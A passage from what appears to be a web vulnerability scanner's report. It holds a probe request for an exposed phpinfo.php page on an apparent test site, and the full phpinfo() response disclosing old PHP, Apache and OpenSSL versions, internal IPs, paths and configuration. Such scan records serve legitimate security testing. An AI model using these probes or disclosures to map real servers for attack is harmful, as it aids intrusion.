Info</Name><SectionText><![CDATA[<br /><b>Vendor:</b><br /><a href="http://subversion.tigris.org/">http://subversion.tigris.org/</a><br /><br /><b>Version Control with Subversion:</b><br /><a href="http://svnbook.red-bean.com/en/1.0/ch07s02.html">Chapter 7. Advanced Topics: Properties</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="2B1FE6958942656181E6657F67E65648"><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/secured/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2B1FE6958942656181E6657F67E65648";PSID="990B9CEB1864EF8E567D50B3C27D5823";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10478";Engine="Request+Modify";SmartMode="4";tid="58";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="bc46c19d";
X-Request-Memo: ID="0988f1fe";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:57:11 GMT
Server: nginx/1.19.0
Connection: close
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 45963

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html><head>
<style type="text/css">
body {background-color: #ffffff; color: #000000;}
body, td, th, h1, h2 {font-family: sans-serif;}
pre {margin: 0px; font-family: monospace;}
a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse;}
.center {text-align: center;}
.center table { margin-left: auto; margin-right: auto; text-align: left;}
.center th { text-align: center !important; }
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccccff; font-weight: bold; color: #000000;}
.h {background-color: #9999cc; font-weight: bold; color: #000000;}
.v {background-color: #cccccc; color: #000000;}
.vr {background-color: #cccccc; text-align: right; color: #000000;}
img {float: right; border: 0px;}
hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
</style>
<title>phpinfo()</title></head>
<body><div class="center">
<table border="0" cellpadding="3" width="600">
<tr class="h"><td>
<a href="http://www.php.net/"><img border="0" src="/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42" alt="PHP Logo" /></a><h1 class="p">PHP Version 5.1.6</h1>
</td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr><td class="e">System </td><td class="v">FreeBSD svn.local 6.2-RELEASE FreeBSD 6.2-RELEASE #0: Fri Jan 12 10:40:27 UTC 2007     root@dessler.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC i386 </td></tr>

<tr><td class="e">Build Date </td><td class="v">Jul 30 2007 12:20:01 </td></tr>
<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039; &#039;--enable-versioning&#039; &#039;--enable-memory-limit&#039; &#039;--with-layout=GNU&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php&#039; &#039;--disable-all&#039; &#039;--enable-libxml&#039; &#039;--with-libxml-dir=/usr/local&#039; &#039;--enable-reflection&#039; &#039;--enable-spl&#039; &#039;--program-prefix=&#039; &#039;--enable-fastcgi&#039; &#039;--with-apxs2=/usr/local/sbin/apxs&#039; &#039;--with-regex=php&#039; &#039;--with-zend-vm=CALL&#039; &#039;--disable-ipv6&#039; &#039;--prefix=/usr/local&#039; &#039;i386-portbld-freebsd6.2&#039; </td></tr>

<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
<tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/usr/local/etc/php.ini </td></tr>
<tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/usr/local/etc/php </td></tr>
<tr><td class="e">additional .ini files parsed </td><td class="v">/usr/local/etc/php/extensions.ini
 </td></tr>
<tr><td class="e">PHP API </td><td class="v">20041225 </td></tr>

<tr><td class="e">PHP Extension </td><td class="v">20050922 </td></tr>
<tr><td class="e">Zend Extension </td><td class="v">220051025 </td></tr>
<tr><td class="e">Debug Build </td><td class="v">no </td></tr>
<tr><td class="e">Thread Safety </td><td class="v">disabled </td></tr>
<tr><td class="e">Zend Memory Manager </td><td class="v">enabled </td></tr>
<tr><td class="e">IPv6 Support </td><td class="v">disabled </td></tr>

<tr><td class="e">Registered PHP Streams </td><td class="v">php, file, http, ftp, https, ftps, compress.zlib   </td></tr>
<tr><td class="e">Registered Stream Socket Transports </td><td class="v">tcp, udp, unix, udg, ssl, sslv3, sslv2, tls </td></tr>
<tr><td class="e">Registered Stream Filters </td><td class="v">string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, convert.iconv.*, zlib.* </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="v"><td>
<a href="http://www.zend.com/"><img border="0" src="/secured/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42" alt="Zend logo" /></a>
This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Engine&nbsp;v2.1.0,&nbsp;Copyright&nbsp;(c)&nbsp;1998-2006&nbsp;Zend&nbsp;Technologies<br /></td></tr>

</table><br />
<hr />
<h1><a href="/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000">PHP Credits</a></h1>
<hr />
<h1>Configuration</h1>
<h2>PHP Core</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">allow_call_time_pass_reference</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">allow_url_fopen</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">always_populate_raw_post_data</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">arg_separator.input</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
<tr><td class="e">arg_separator.output</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
<tr><td class="e">asp_tags</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">auto_append_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">auto_globals_jit</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">auto_prepend_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">browscap</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">default_charset</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">default_mimetype</td><td class="v">text/html</td><td class="v">text/html</td></tr>

<tr><td class="e">define_syslog_variables</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">disable_classes</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">disable_functions</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">display_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">display_startup_errors</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">doc_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_ext</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">enable_dl</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">error_append_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">error_log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_prepend_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_reporting</td><td class="v">2039</td><td class="v">2039</td></tr>
<tr><td class="e">expose_php</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">extension_dir</td><td class="v">/usr/local/lib/php/20050922</td><td class="v">/usr/local/lib/php/20050922</td></tr>

<tr><td class="e">file_uploads</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">highlight.bg</td><td class="v"><font style="color: #FFFFFF">#FFFFFF</font></td><td class="v"><font style="color: #FFFFFF">#FFFFFF</font></td></tr>
<tr><td class="e">highlight.comment</td><td class="v"><font style="color: #FF8000">#FF8000</font></td><td class="v"><font style="color: #FF8000">#FF8000</font></td></tr>
<tr><td class="e">highlight.default</td><td class="v"><font style="color: #0000BB">#0000BB</font></td><td class="v"><font style="color: #0000BB">#0000BB</font></td></tr>
<tr><td class="e">highlight.html</td><td class="v"><font style="color: #000000">#000000</font></td><td class="v"><font style="color: #000000">#000000</font></td></tr>

<tr><td class="e">highlight.keyword</td><td class="v"><font style="color: #007700">#007700</font></td><td class="v"><font style="color: #007700">#007700</font></td></tr>
<tr><td class="e">highlight.string</td><td class="v"><font style="color: #DD0000">#DD0000</font></td><td class="v"><font style="color: #DD0000">#DD0000</font></td></tr>
<tr><td class="e">html_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">ignore_repeated_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">ignore_repeated_source</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">ignore_user_abort</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">implicit_flush</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">include_path</td><td class="v">.:</td><td class="v">.:</td></tr>
<tr><td class="e">log_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">log_errors_max_len</td><td class="v">1024</td><td class="v">1024</td></tr>

<tr><td class="e">magic_quotes_gpc</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">magic_quotes_runtime</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">magic_quotes_sybase</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mail.force_extra_parameters</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">max_execution_time</td><td class="v">30</td><td class="v">30</td></tr>

<tr><td class="e">max_input_time</td><td class="v">60</td><td class="v">60</td></tr>
<tr><td class="e">memory_limit</td><td class="v">8M</td><td class="v">8M</td></tr>
<tr><td class="e">open_basedir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">output_buffering</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">post_max_size</td><td class="v">8M</td><td class="v">8M</td></tr>
<tr><td class="e">precision</td><td class="v">12</td><td class="v">12</td></tr>
<tr><td class="e">realpath_cache_size</td><td class="v">16K</td><td class="v">16K</td></tr>
<tr><td class="e">realpath_cache_ttl</td><td class="v">120</td><td class="v">120</td></tr>
<tr><td class="e">register_argc_argv</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">register_globals</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">register_long_arrays</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">report_memleaks</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">report_zend_debug</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">safe_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">safe_mode_exec_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">safe_mode_gid</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">safe_mode_include_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">sendmail_from</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">sendmail_path</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i&nbsp;</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i&nbsp;</td></tr>

<tr><td class="e">serialize_precision</td><td class="v">100</td><td class="v">100</td></tr>
<tr><td class="e">short_open_tag</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">SMTP</td><td class="v">localhost</td><td class="v">localhost</td></tr>
<tr><td class="e">smtp_port</td><td class="v">25</td><td class="v">25</td></tr>
<tr><td class="e">sql.safe_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">track_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">unserialize_callback_func</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">upload_max_filesize</td><td class="v">2M</td><td class="v">2M</td></tr>
<tr><td class="e">upload_tmp_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">user_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">variables_order</td><td class="v">EGPCS</td><td class="v">EGPCS</td></tr>
<tr><td class="e">xmlrpc_error_number</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xmlrpc_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">y2k_compliance</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">zend.ze1_compatibility_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

</table><br />
<h2><a name="module_apache2handler">apache2handler</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Apache Version </td><td class="v">Apache/2.2.3 (FreeBSD) DAV/2 PHP/5.1.6 mod_ssl/2.2.3 OpenSSL/0.9.7e-p1 </td></tr>
<tr><td class="e">Apache API Version </td><td class="v">20051115 </td></tr>
<tr><td class="e">Server Administrator </td><td class="v">root@localhost.localdomain </td></tr>
<tr><td class="e">Hostname:Port </td><td class="v">acuart:0 </td></tr>
<tr><td class="e">User/Group </td><td class="v">www(80)/80 </td></tr>

<tr><td class="e">Max Requests </td><td class="v">Per Child: 10000 - Keep Alive: on - Max Per Connection: 100 </td></tr>
<tr><td class="e">Timeouts </td><td class="v">Connection: 300 - Keep-Alive: 5 </td></tr>
<tr><td class="e">Virtual Server </td><td class="v">Yes </td></tr>
<tr><td class="e">Server Root </td><td class="v">/usr/local </td></tr>
<tr><td class="e">Loaded Modules </td><td class="v">core prefork http_core mod_so mod_authn_file mod_authn_dbm mod_authn_anon mod_authn_default mod_authn_alias mod_authz_host mod_authz_groupfile mod_authz_user mod_authz_dbm mod_authz_owner mod_authz_default mod_auth_basic mod_auth_digest mod_file_cache mod_cache mod_disk_cache mod_include mod_filter mod_charset_lite mod_deflate mod_log_config mod_logio mod_env mod_mime_magic mod_cern_meta mod_expires mod_headers mod_usertrack mod_setenvif mod_version mod_ssl mod_mime mod_dav mod_status mod_autoindex mod_asis mod_info mod_cgi mod_dav_fs mod_vhost_alias mod_negotiation mod_dir mod_imagemap mod_actions mod_speling mod_userdir mod_alias mod_rewrite mod_php5 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">engine</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">last_modified</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xbithack</td><td class="v">0</td><td class="v">0</td></tr>
</table><br />

<h2>Apache Environment</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">HTTP_HOST </td><td class="v">acuart </td></tr>
<tr><td class="e">HTTP_USER_AGENT </td><td class="v">Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11 </td></tr>
<tr><td class="e">HTTP_ACCEPT </td><td class="v">text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 </td></tr>
<tr><td class="e">HTTP_ACCEPT_LANGUAGE </td><td class="v">en-us,en;q=0.5 </td></tr>

<tr><td class="e">HTTP_ACCEPT_ENCODING </td><td class="v">gzip,deflate </td></tr>
<tr><td class="e">HTTP_ACCEPT_CHARSET </td><td class="v">ISO-8859-1,utf-8;q=0.7,*;q=0.7 </td></tr>
<tr><td class="e">HTTP_KEEP_ALIVE </td><td class="v">300 </td></tr>
<tr><td class="e">HTTP_CONNECTION </td><td class="v">keep-alive </td></tr>
<tr><td class="e">PATH </td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin </td></tr>
<tr><td class="e">SERVER_SIGNATURE </td><td class="v"><i>no value</i> </td></tr>

<tr><td class="e">SERVER_SOFTWARE </td><td class="v">Apache/2.2.3 (FreeBSD) DAV/2 PHP/5.1.6 mod_ssl/2.2.3 OpenSSL/0.9.7e-p1 </td></tr>
<tr><td class="e">SERVER_NAME </td><td class="v">acuart </td></tr>
<tr><td class="e">SERVER_ADDR </td><td class="v">192.168.0.5 </td></tr>
<tr><td class="e">SERVER_PORT </td><td class="v">80 </td></tr>
<tr><td class="e">REMOTE_ADDR </td><td class="v">192.168.0.26 </td></tr>
<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/acuart/ </td></tr>

<tr><td class="e">SERVER_ADMIN </td><td class="v">root@localhost.localdomain </td></tr>
<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/acuart/secured/phpinfo.php </td></tr>
<tr><td class="e">REMOTE_PORT </td><td class="v">11493 </td></tr>
<tr><td class="e">GATEWAY_INTERFACE </td><td class="v">CGI/1.1 </td></tr>
<tr><td class="e">SERVER_PROTOCOL </td><td class="v">HTTP/1.1 </td></tr>
<tr><td class="e">REQUEST_METHOD </td><td class="v">GET </td></tr>

<tr><td class="e">QUERY_STRING </td><td class="v"><i>no value</i> </td></tr>
<tr><td class="e">REQUEST_URI </td><td class="v">/secured/phpinfo.php </td></tr>
<tr><td class="e">SCRIPT_NAME </td><td class="v">/secured/phpinfo.php </td></tr>
</table><br />
<h2>HTTP Headers Information</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th colspan="2">HTTP Request Headers</th></tr>
<tr><td class="e">HTTP Request </td><td class="v">GET /secured/phpinfo.php HTTP/1.1 </td></tr>

<tr><td class="e">Host </td><td class="v">acuart </td></tr>
<tr><td class="e">User-Agent </td><td class="v">Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11 </td></tr>
<tr><td class="e">Accept </td><td class="v">text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 </td></tr>
<tr><td class="e">Accept-Language </td><td class="v">en-us,en;q=0.5 </td></tr>
<tr><td class="e">Accept-Encoding </td><td class="v">gzip,deflate </td></tr>
<tr><td class="e">Accept-Charset </td><td class="v">ISO-8859-1,utf-8;q=0.7,*;q=0.7 </td></tr>

<tr><td class="e">Keep-Alive </td><td class="v">300 </td></tr>
<tr><td class="e">Connection </td><td class="v">keep-alive </td></tr>
<tr class="h"><th colspan="2">HTTP Response Headers</th></tr>
<tr><td class="e">X-Powered-By </td><td class="v">PHP/5.1.6 </td></tr>
<tr><td class="e">Keep-Alive </td><td class="v">timeout=5, max=100 </td></tr>
<tr><td class="e">Connection </td><td class="v">Keep-Alive </td></tr>

<tr><td class="e">Transfer-Encoding </td><td class="v">chunked </td></tr>
<tr><td class="e">Content-Type </td><td class="v">text/html </td></tr>
</table><br />
<h2><a name="module_ctype">ctype</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">ctype functions </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_curl">curl</a></h2>
<table border="0" cellpadding="3" width="600">

<tr><td class="e">CURL support </td><td class="v">enabled </td></tr>
<tr><td class="e">CURL Information </td><td class="v">libcurl/7.15.5 OpenSSL/0.9.7e zlib/1.2.3 </td></tr>
</table><br />
<h2><a name="module_date">date</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">date/time support </td><td class="v">enabled </td></tr>
<tr><td class="e">Timezone Database Version </td><td class="v">2006.1 </td></tr>
<tr><td class="e">Timezone Database </td><td class="v">internal </td></tr>

<tr><td class="e">Default timezone </td><td class="v">Europe/Helsinki </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">date.default_latitude</td><td class="v">31.7667</td><td class="v">31.7667</td></tr>
<tr><td class="e">date.default_longitude</td><td class="v">35.2333</td><td class="v">35.2333</td></tr>

<tr><td class="e">date.sunrise_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
<tr><td class="e">date.sunset_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
<tr><td class="e">date.timezone</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />
<h2><a name="module_dom">dom</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">DOM/XML </td><td class="v">enabled </td></tr>

<tr><td class="e">DOM/XML API Version </td><td class="v">20031129 </td></tr>
<tr><td class="e">libxml Version </td><td class="v">2.6.26 </td></tr>
<tr><td class="e">HTML Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XPath Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XPointer Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Schema Support </td><td class="v">enabled </td></tr>

<tr><td class="e">RelaxNG Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_exif">exif</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">EXIF Support </td><td class="v">enabled </td></tr>
<tr><td class="e">EXIF Version </td><td class="v">1.4 $Id: exif.c,v 1.173.2.5 2006/04/10 18:23:24 helly Exp $ </td></tr>
<tr><td class="e">Supported EXIF Version </td><td class="v">0220 </td></tr>
<tr><td class="e">Supported filetypes </td><td class="v">JPEG,TIFF </td></tr>

</table><br />
<h2><a name="module_ftp">ftp</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">FTP support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_gd">gd</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">GD Support </td><td class="v">enabled </td></tr>
<tr><td class="e">GD Version </td><td class="v">bundled (2.0.28 compatible) </td></tr>

<tr><td class="e">FreeType Support </td><td class="v">enabled </td></tr>
<tr><td class="e">FreeType Linkage </td><td class="v">with freetype </td></tr>
<tr><td class="e">FreeType Version </td><td class="v">2.2.1 </td></tr>
<tr><td class="e">T1Lib Support </td><td class="v">enabled </td></tr>
<tr><td class="e">GIF Read Support </td><td class="v">enabled </td></tr>
<tr><td class="e">GIF Create Support </td><td class="v">enabled </td></tr>

<tr><td class="e">JPG Support </td><td class="v">enabled </td></tr>
<tr><td class="e">PNG Support </td><td class="v">enabled </td></tr>
<tr><td class="e">WBMP Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XPM Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XBM Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_gettext">gettext</a></h2>

<table border="0" cellpadding="3" width="600">
<tr><td class="e">GetText Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_iconv">iconv</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">iconv support </td><td class="v">enabled </td></tr>
<tr><td class="e">iconv implementation </td><td class="v">libiconv </td></tr>
<tr><td class="e">iconv library version </td><td class="v">1.9 </td></tr>

</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">iconv.input_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
<tr><td class="e">iconv.internal_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
<tr><td class="e">iconv.output_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>

</table><br />
<h2><a name="module_libxml">libxml</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">libXML support </td><td class="v">active </td></tr>
<tr><td class="e">libXML Version </td><td class="v">2.6.26 </td></tr>
<tr><td class="e">libXML streams </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_mssql">mssql</a></h2>
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>MSSQL Support</th><th>enabled</th></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
<tr><td class="e">Library version </td><td class="v">FreeTDS </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>

<tr><td class="e">mssql.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mssql.batchsize</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">mssql.charset</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mssql.compatability_mode</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mssql.connect_timeout</td><td class="v">5</td><td class="v">5</td></tr>

<tr><td class="e">mssql.datetimeconvert</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mssql.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mssql.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mssql.max_procs</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mssql.min_error_severity</td><td class="v">10</td><td class="v">10</td></tr>

<tr><td class="e">mssql.min_message_severity</td><td class="v">10</td><td class="v">10</td></tr>
<tr><td class="e">mssql.secure_connection</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mssql.textlimit</td><td class="v">Server default</td><td class="v">Server default</td></tr>
<tr><td class="e">mssql.textsize</td><td class="v">Server default</td><td class="v">Server default</td></tr>
<tr><td class="e">mssql.timeout</td><td class="v">60</td><td class="v">60</td></tr>

</table><br />
<h2><a name="module_mysql">mysql</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>MySQL Support</th><th>enabled</th></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
<tr><td class="e">Client API version </td><td class="v">5.1.11-beta </td></tr>
<tr><td class="e">MYSQL_MODULE_TYPE </td><td class="v"><i>no value</i> </td></tr>

<tr><td class="e">MYSQL_SOCKET </td><td class="v">/tmp/mysql.sock </td></tr>
<tr><td class="e">MYSQL_INCLUDE </td><td class="v"><i>no value</i> </td></tr>
<tr><td class="e">MYSQL_LIBS </td><td class="v"><i>no value</i> </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>

<tr><td class="e">mysql.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mysql.connect_timeout</td><td class="v">60</td><td class="v">60</td></tr>
<tr><td class="e">mysql.default_host</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.default_password</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.default_port</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">mysql.default_socket</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.default_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysql.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysql.trace_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

</table><br />
<h2><a name="module_mysqli">mysqli</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>MysqlI Support</th><th>enabled</th></tr>
<tr><td class="e">Client API library version </td><td class="v">5.1.11-beta </td></tr>
<tr><td class="e">Client API header version </td><td class="v">5.1.11-beta </td></tr>
<tr><td class="e">MYSQLI_SOCKET </td><td class="v">/tmp/mysql.sock </td></tr>
</table><br />

<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">mysqli.default_host</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_port</td><td class="v">3306</td><td class="v">3306</td></tr>
<tr><td class="e">mysqli.default_pw</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">mysqli.default_socket</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
